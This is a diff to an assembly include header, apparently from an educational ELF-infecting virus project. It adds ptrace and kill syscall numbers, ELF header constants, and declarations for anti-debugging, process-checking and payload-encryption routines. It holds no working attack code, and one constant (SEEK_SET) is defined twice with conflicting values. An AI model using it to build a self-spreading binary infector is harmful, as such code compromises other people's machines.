@@ -18,8 +18,10 @@
 	%define SYS_RENAME 82
 	%define SYS_UNLINK 87
 	%define SYS_SYMLINK 88
+	%define SYS_PTRACE 101
 	%define SYS_GETEUID 107
 	%define SYS_GETDENTS64 217
+	%define SYS_KILL 62
 
 ; Open flags
 	%define O_RDWR 2
@@ -43,17 +45,49 @@
 	%define MAP_PRIVATE 2
 	%define MAP_ANONYMOUS 32
 
+; Lseek
+	%define SEEK_SET		0
+	%define SEEK_SET		2
+
+; Ptrace
+	%define PTRACE_TRACEME	0
+
+; Kill
+	%define SIGCONT			18
+
+; Getdents64
+	%define DT_DIR			4
+	%define DT_REG			8
+
+; ELF
+	%define ELFMAGIC		0x464c457f
+	%define ELFCLASS64		2
+	%define ET_EXEC			2
+	%define PF_X			1
+	%define PF_W			2
+	%define PF_R			4
+	%define PT_LOAD			1
+
 ; includes
 	%ifndef FAMINE_S
 		extern _start
 		extern _string
 		extern _o_entry
-		extern _read_dir
-		extern _ft_strlen
-		extern _verif
+		extern _force_exit
+		extern _jmp_to_o_entry
+;		extern _read_dir
+;		extern _ft_strlen
+;		extern _verif
 		extern _verify_o_entry
-		extern _continue_normaly
+;		extern _encrypted_part_start
+	%endif
+
+	%ifndef ENCRYPTED_START_S
+		extern _read_dir
 		extern _encrypted_part_start
+		extern _verif
+		extern _ft_strlen
+		extern _continue_normaly
 	%endif
 
 	%ifndef OPTIONS_S
@@ -84,5 +118,22 @@
 
 	%ifndef ENCRYPT_S
 		extern _encrypt_zone
+	%endif
+
+	%ifndef CHECKDBG_S
+		extern _checkdbg
+	%endif
+
+	%ifndef CHECKPROC_S
+		extern _checkproc
+	%endif
+
+	%ifndef FT_STRSTR_S
+		extern _ft_strstr
+		extern _ft_strxequ
+	%endif
+
+	%ifndef FT_STREQU_S
+		extern _ft_strequ
 	%endif
 %endif
